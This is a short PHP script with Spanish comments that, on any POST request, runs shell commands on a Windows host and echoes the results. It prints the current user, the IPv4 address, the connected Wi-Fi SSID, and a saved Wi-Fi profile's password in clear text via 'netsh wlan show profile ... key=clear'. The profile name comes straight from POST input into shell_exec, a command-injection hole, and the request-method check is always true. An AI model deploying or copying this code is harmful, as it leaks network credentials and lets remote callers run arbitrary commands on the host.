<?php
if ('POST') {
    // Obtener los datos enviados a través de POST
    $valor1 = $_POST['valor1'];
    $valor2 = $_POST['valor2'];
    if (($valor1) or ($valor2)) {
        //error_reporting(0);
        echo $output = shell_exec('whoami');
        echo $t=shell_exec('ipconfig | findstr "IPv4"');
        echo $t1=shell_exec('netsh wlan show interfaces | findstr "SSID"');
        echo $t2=Shell_exec("netsh wlan show profile name=$valor1 key=clear | findstr clave ");
        // Imprimir la salida de los comandos
    } else {
        echo "Introduce Datos.";
    }
} else {
    echo "La solicitud no es válida.";
}
?>
